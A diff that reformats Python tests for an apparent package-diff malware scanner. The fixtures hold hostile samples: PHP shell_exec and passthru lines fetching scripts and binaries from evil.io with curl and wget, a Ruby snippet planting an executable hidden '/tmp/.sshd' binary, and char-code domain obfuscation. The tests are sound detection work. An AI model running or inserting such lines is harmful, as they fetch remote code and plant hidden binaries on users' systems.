@@ -2265,9 +2265,7 @@ def test_build_diff_cursorrules_clean_not_flagged(tmp_path):
 def test_has_obfuscation_php_array_map_chr(tmp_path):
     """array_map('chr', [...]) char-code domain construction is detected."""
     f = tmp_path / "helper.php"
-    f.write_text(
-        "<?php $domain = implode(array_map('chr', [101, 118, 105, 108, 46, 99, 111])); ?>"
-    )
+    f.write_text("<?php $domain = implode(array_map('chr', [101, 118, 105, 108, 46, 99, 111])); ?>")
     assert _has_obfuscation(f, ".php") is True
 
 
@@ -2290,8 +2288,7 @@ def test_net_calls_detected_ruby_home_redirect(tmp_path):
         tmp_path / "new",
         {
             "lib/setup.rb": (
-                "ENV['HOME'] = '/tmp/gemhome'\n"
-                "FileUtils.mkdir_p('/tmp/gemhome/.gem')\n"
+                "ENV['HOME'] = '/tmp/gemhome'\nFileUtils.mkdir_p('/tmp/gemhome/.gem')\n"
             )
         },
     )
@@ -2304,7 +2301,9 @@ def test_net_calls_detected_ruby_hidden_binary_tmp(tmp_path):
     old = _write_files(tmp_path / "old", {})
     new = _write_files(
         tmp_path / "new",
-        {"lib/fetch.rb": "File.binwrite('/tmp/.sshd', response.body)\nFile.chmod(0755, '/tmp/.sshd')\n"},
+        {
+            "lib/fetch.rb": "File.binwrite('/tmp/.sshd', response.body)\nFile.chmod(0755, '/tmp/.sshd')\n"
+        },
     )
     _, _, _, _, net_calls, *_ = _build_diff(old, new)
     assert net_calls is True
@@ -2328,7 +2327,9 @@ def test_net_calls_detected_php_shell_exec_curl(tmp_path):
     old = _write_files(tmp_path / "old", {})
     new = _write_files(
         tmp_path / "new",
-        {"src/Installer.php": "<?php $result = shell_exec('curl -skL https://evil.io/setup.sh');\n"},
+        {
+            "src/Installer.php": "<?php $result = shell_exec('curl -skL https://evil.io/setup.sh');\n"
+        },
     )
     _, _, _, _, net_calls, *_ = _build_diff(old, new)
     assert net_calls is True
@@ -2346,7 +2347,10 @@ def test_net_calls_detected_php_passthru_wget(tmp_path):
 
 
 def test_added_lines_have_net_calls_php_shell_exec():
-    assert _added_lines_have_net_calls(["shell_exec('curl -skL https://evil.io/payload')"], ".php") is True
+    assert (
+        _added_lines_have_net_calls(["shell_exec('curl -skL https://evil.io/payload')"], ".php")
+        is True
+    )
     assert _added_lines_have_net_calls(["passthru('wget https://evil.io/bin')"], ".php") is True
     assert _added_lines_have_net_calls(["$html = file_get_contents($url)"], ".php") is False
 
